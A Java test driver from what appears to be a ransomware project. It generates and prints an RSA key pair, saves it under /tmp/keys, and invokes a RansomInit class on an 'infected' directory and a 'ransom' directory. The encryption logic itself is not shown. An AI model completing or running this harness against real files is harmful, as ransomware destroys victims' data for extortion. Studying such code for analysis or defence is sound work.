package f0ns1.test;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.NoSuchAlgorithmException;
import java.security.PrivateKey;
import java.util.Base64;

import f0ns1.RansomInit;

public class TestRansom {

	public static void main(String[] args) {
		String dir = "/tmp/keys";
		String infectedDir=args[0];
		String ransomDir=args[1];
		String keys=args[2];
		PrivateKey pk = generateKeyPair(dir);
		RansomInit ransom = new RansomInit();
		String[] argv = { infectedDir, ransomDir, Base64.getEncoder().encodeToString(pk.getEncoded())};
		ransom.main(argv);

	}

	private static PrivateKey generateKeyPair(String dir) {
		KeyPairGenerator kpg= null;
		KeyPair kp= null;
		try {
			kpg = KeyPairGenerator.getInstance("RSA");
			kpg.initialize(2048);
			kp = kpg.generateKeyPair();
			String outFile = dir + "/rsa_test";
			File file = new File(dir);
			if (!file.exists()) {
				file.mkdir();
			}
			File out_priv = new File(outFile + ".key");
			if (!out_priv.exists()) {
				out_priv.createNewFile();
			}
			FileOutputStream out = new FileOutputStream(out_priv.getPath());
			out.write(kp.getPrivate().getEncoded());
			out.close();
			File out_pub = new File(outFile + ".pub");
			if (!out_pub.exists()) {
				out_pub.createNewFile();
			}
			out = new FileOutputStream(outFile + ".pub");
			out.write(kp.getPublic().getEncoded());
			out.close();
			showKeys(kp);
		} catch (NoSuchAlgorithmException | IOException e) {
			e.printStackTrace();
		}

		return (kp != null)? kp.getPrivate():null;
	}

	private static void showKeys(KeyPair kp) {
		System.out.println("Show RSA keys : 2048 bits");
		System.out.println("\t\t Public Key --- \n " + kp.getPublic());
		System.out.println("\t\t Private key ---- \n" + kp.getPrivate());
	}

}
